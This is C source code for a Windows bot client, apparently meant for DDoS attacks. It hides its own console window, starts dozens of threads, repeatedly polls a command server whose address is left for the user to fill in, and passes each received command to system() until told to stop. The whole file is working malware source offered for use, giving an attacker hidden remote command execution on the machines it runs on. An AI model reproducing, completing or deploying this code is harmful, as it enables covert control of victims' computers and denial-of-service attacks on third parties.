#include <stdio.h>
#include <stdlib.h>
#include <WinSock2.h>
#include <windows.h>
#include <wininet.h>
#include <string.h>
#include <time.h>
#define NUM_THREADS 10    // Define number of threads here 
#define THREADS_PERTIME 4 // Define number of running threads per time here 
#pragma comment(lib, "ws2_32.lib")  //Load ws2_32.dll

int hasConnected = 0;

void changeCMD(char a[], char b[]) {
    for (int i = 0; i < strlen(a); i++) {
        a[i] = 0;
    }
    for (int i = 0; i < strlen(b); i++) {
        a[i] = b[i];
    }
}
int returnSecond() {
    time_t now;
    struct tm* tm;

    now = time(0);
    if ((tm = localtime(&now)) == NULL) {
        printf("Error extracting time stuff\n");
        return 1;
    }
    /*
    printf("%04d-%02d-%02d %02d:%02d:%02d\n",
        tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
        tm->tm_hour, tm->tm_min, tm->tm_sec);
        */
    return tm->tm_sec;
}
void DDoS()
{
    int count = 0;
    char cmd[MAXBYTE] = { 0 };
    while (1) {
        char szBuffer[MAXBYTE] = { 0 };
        if (returnSecond() == 30 || returnSecond() == 0 || hasConnected == 0) {
            WSADATA wsaData;
            WSAStartup(MAKEWORD(2, 2), &wsaData);
            //Create the socket
            SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
            //Ask for the connect to the server
            sockaddr_in sockAddr;
            memset(&sockAddr, 0, sizeof(sockAddr));  //All bits are set 0
            sockAddr.sin_family = PF_INET; //To use IPv4 address
            sockAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //Your server's IP Address
            sockAddr.sin_port = htons(1234); //Your IP Port

            int a = connect(sock, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR));
            //Receive the command from server.
            char s[20] = "";
            itoa(count, s, 10);
            char* str = s;
            //send(sock, str, strlen(str) + sizeof(char), NULL);
            
            recv(sock, szBuffer, MAXBYTE, NULL);
            //Output the command from server
            printf("command from server : %s\n", szBuffer);
            //Close the connect
            closesocket(sock);
            //Stop using the DLL.
            WSACleanup();
            if (a == 0) {
                hasConnected = 1;
            }
        }
        //If the server sends the command to the client.
        if (szBuffer[0] != 0) {
            for (int i = 0; i < MAXBYTE; i++) {
                cmd[i] = 0;
            }
            changeCMD(cmd, szBuffer);

        }

        //If you want to stop DDoS.
        if (szBuffer[0] == 's' && szBuffer[1] == 't' && szBuffer[2] == 'o' && szBuffer[3] == 'p') {
            for (int i = 0; i < strlen(cmd); i++) {
                cmd[i] = 0;
            }
        }
        //If the cmd has the command.
        if (cmd[0] != 0) {
            printf("command from temp : %s\n", cmd);
            system(cmd);
            count++;
        }
        /*if (szBuffer[0] != 0) {
            system(szBuffer);
            count++;
        }*/
    }
}

DWORD WINAPI Thread( void* i )
{
    
    DDoS();
    return 0;
}

void Stealth() {
    HWND Stealth = 0;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}






int main() {
    //Close the cmd window
    Stealth();
    
    HANDLE* arrayThread;
    arrayThread = (HANDLE*)malloc(NUM_THREADS * THREADS_PERTIME * sizeof(int));
    DWORD ThreadId;
    
    for (int i = 0; i < NUM_THREADS * THREADS_PERTIME; i++)
    {
        arrayThread[i] = CreateThread(NULL, 0, Thread, (void*)i, 0, &ThreadId);
        //printf("%d\n",arrayThread[i]);
        if (arrayThread[i] == NULL)
        {
            printf("Create Thread %d get failed. Error no: %d", i, GetLastError);
        }
    }
    int n = 0;
    for (int i = 1; i < NUM_THREADS * THREADS_PERTIME; i++) {
        SuspendThread(arrayThread[i]);
    }
    while (1) {
        if (n == NUM_THREADS - 1) {
            for (int i = 0; i < THREADS_PERTIME; i++) {
                SuspendThread(arrayThread[n * THREADS_PERTIME + i]);//Pause the thread
            }
            for (int i = 0; i < THREADS_PERTIME; i++) {
                ResumeThread(arrayThread[i]);//Run the thread
            }
            n = 0;
        }
        else {
            for (int i = 0; i < THREADS_PERTIME; i++) {
                SuspendThread(arrayThread[n* THREADS_PERTIME + i]);//Pause the thread
            }
            for (int i = 0; i < THREADS_PERTIME; i++) {
                ResumeThread(arrayThread[(n + 1)* THREADS_PERTIME + i]);//Run the thread
            }
            n++;
        }
        Sleep(50);
    }
    WaitForMultipleObjects(NUM_THREADS * THREADS_PERTIME, arrayThread, TRUE, INFINITE);
    DWORD lpExitCode;
    BOOL result;

    for (int i = 0; i < NUM_THREADS * THREADS_PERTIME; i++)
    {
        CloseHandle(arrayThread[i]);
    }


    return 0;
}
